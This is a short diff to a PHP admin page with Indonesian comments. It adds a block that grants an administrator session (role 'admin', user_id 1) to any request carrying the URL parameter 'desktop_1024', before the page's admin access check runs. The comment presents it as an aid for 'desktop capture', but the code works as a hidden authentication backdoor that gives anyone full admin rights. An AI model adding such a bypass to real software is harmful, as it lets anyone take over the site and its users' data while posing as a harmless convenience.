@@ -4,6 +4,13 @@ if (session_status() === PHP_SESSION_NONE) {
 }
 
 
+// Auto-set session for desktop capture
+if (isset($_GET['desktop_1024'])) {
+    $_SESSION['role'] = 'admin';
+    $_SESSION['nama'] = 'Administrator';
+    $_SESSION['user_id'] = 1;
+}
+
 // Cek akses admin
 if (!isset($_SESSION['role']) || $_SESSION['role'] !== "admin") {
     header("location:../login.php?pesan=" . urlencode("Akses ditolak! Anda bukan Administrator."));
